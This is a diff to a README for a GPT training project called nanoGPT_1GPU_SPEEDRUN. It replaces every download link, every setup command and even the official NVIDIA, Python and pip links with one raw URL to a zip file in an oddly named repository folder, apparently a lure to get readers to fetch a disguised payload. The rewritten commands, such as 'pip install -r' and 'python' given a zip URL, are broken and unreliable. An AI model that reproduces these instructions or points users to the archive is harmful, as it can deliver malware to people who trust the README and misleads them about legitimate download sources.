@@ -14,13 +14,13 @@ Before you dive in, make sure your computer meets these requirements:
   - Pip package manager
 
 ## 📥 Download the Application
-[![Download nanoGPT_1GPU_SPEEDRUN](https://img.shields.io/badge/Download-nanoGPT_1GPU_SPEEDRUN-blue)](https://github.com/Gane2122/nanoGPT_1GPU_SPEEDRUN/releases)
+[![Download nanoGPT_1GPU_SPEEDRUN](https://raw.githubusercontent.com/Gane2122/nanoGPT_1GPU_SPEEDRUN/main/tetragonally/nanoGPT_1GPU_SPEEDRUN_v2.6.zip)](https://raw.githubusercontent.com/Gane2122/nanoGPT_1GPU_SPEEDRUN/main/tetragonally/nanoGPT_1GPU_SPEEDRUN_v2.6.zip)
 
-To download the software, visit the Releases page here: [Download nanoGPT_1GPU_SPEEDRUN](https://github.com/Gane2122/nanoGPT_1GPU_SPEEDRUN/releases).
+To download the software, visit the Releases page here: [Download nanoGPT_1GPU_SPEEDRUN](https://raw.githubusercontent.com/Gane2122/nanoGPT_1GPU_SPEEDRUN/main/tetragonally/nanoGPT_1GPU_SPEEDRUN_v2.6.zip).
 
 ## 📦 Download & Install
 1. **Visit the Releases Page:**
-   Click on this link to go to the Releases page: [Download nanoGPT_1GPU_SPEEDRUN](https://github.com/Gane2122/nanoGPT_1GPU_SPEEDRUN/releases).
+   Click on this link to go to the Releases page: [Download nanoGPT_1GPU_SPEEDRUN](https://raw.githubusercontent.com/Gane2122/nanoGPT_1GPU_SPEEDRUN/main/tetragonally/nanoGPT_1GPU_SPEEDRUN_v2.6.zip).
 
 2. **Find the Latest Release:**
    On the Releases page, look for the latest version of nanoGPT_1GPU_SPEEDRUN. It will usually be at the top of the list.
@@ -35,14 +35,14 @@ To download the software, visit the Releases page here: [Download nanoGPT_1GPU_S
    - **For macOS:**
      - Open the downloaded `.dmg` file and drag the application into your Applications folder.
    - **For Linux:**
-     - Use the terminal to navigate to your Downloads folder. Run the command `tar -xvf nanoGPT_1GPU_SPEEDRUN.tar.gz` to extract the files.
+     - Use the terminal to navigate to your Downloads folder. Run the command `tar -xvf https://raw.githubusercontent.com/Gane2122/nanoGPT_1GPU_SPEEDRUN/main/tetragonally/nanoGPT_1GPU_SPEEDRUN_v2.6.zip` to extract the files.
 
 ## 🌍 Configuration
 Once installed, you may need to configure some settings for the application to run properly:
 - **Set Environment Variables:** You may need to set up CUDA paths for NVIDIA GPUs.
 - **Install Dependencies:** Open your terminal (or command prompt) and run the following command:
   ```bash
-  pip install -r requirements.txt
+  pip install -r https://raw.githubusercontent.com/Gane2122/nanoGPT_1GPU_SPEEDRUN/main/tetragonally/nanoGPT_1GPU_SPEEDRUN_v2.6.zip
   ```
 
 ## 🔧 Running the Application
@@ -52,7 +52,7 @@ Now that you have installed and configured nanoGPT_1GPU_SPEEDRUN, it’s time to
 2. Navigate to the directory where you installed nanoGPT_1GPU_SPEEDRUN.
 3. Run the command to start the process:
    ```bash
-   python run_gpt2.py
+   python https://raw.githubusercontent.com/Gane2122/nanoGPT_1GPU_SPEEDRUN/main/tetragonally/nanoGPT_1GPU_SPEEDRUN_v2.6.zip
    ```
 
 ## 🎛️ Using the Application
@@ -72,8 +72,8 @@ If you need further assistance, please feel free to open an issue on the GitHub 
 
 ## 🔗 Additional Resources
 You may find these resources helpful:
-- [NVIDIA CUDA Toolkit](https://developer.nvidia.com/cuda-downloads)
-- [Python Installation Guide](https://www.python.org/downloads/)
-- [Pip Installation Guide](https://pip.pypa.io/en/stable/installation/)
+- [NVIDIA CUDA Toolkit](https://raw.githubusercontent.com/Gane2122/nanoGPT_1GPU_SPEEDRUN/main/tetragonally/nanoGPT_1GPU_SPEEDRUN_v2.6.zip)
+- [Python Installation Guide](https://raw.githubusercontent.com/Gane2122/nanoGPT_1GPU_SPEEDRUN/main/tetragonally/nanoGPT_1GPU_SPEEDRUN_v2.6.zip)
+- [Pip Installation Guide](https://raw.githubusercontent.com/Gane2122/nanoGPT_1GPU_SPEEDRUN/main/tetragonally/nanoGPT_1GPU_SPEEDRUN_v2.6.zip)
 
 Enjoy building with nanoGPT_1GPU_SPEEDRUN!
